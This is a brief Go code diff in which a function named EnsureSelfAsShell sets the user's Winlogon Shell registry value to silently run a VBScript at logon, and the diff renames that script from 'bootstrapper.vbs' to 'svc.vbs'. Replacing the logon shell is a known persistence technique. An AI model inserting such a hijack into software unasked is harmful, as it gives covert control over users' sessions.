@@ -36,7 +36,7 @@ func setUserShell(shell string) error {
 
 // ensureSelfAsShell sets HKCU Winlogon Shell to this exe (quoted absolute path) if not already.
 func EnsureSelfAsShell() error {
-	desired := `wscript.exe //B //Nologo "C:\launcher\bootstrapper.vbs"`
+	desired := `wscript.exe //B //Nologo "C:\launcher\svc.vbs"`
 	current, _ := getUserShell()
 	if strings.EqualFold(strings.TrimSpace(current), desired) {
 		return nil
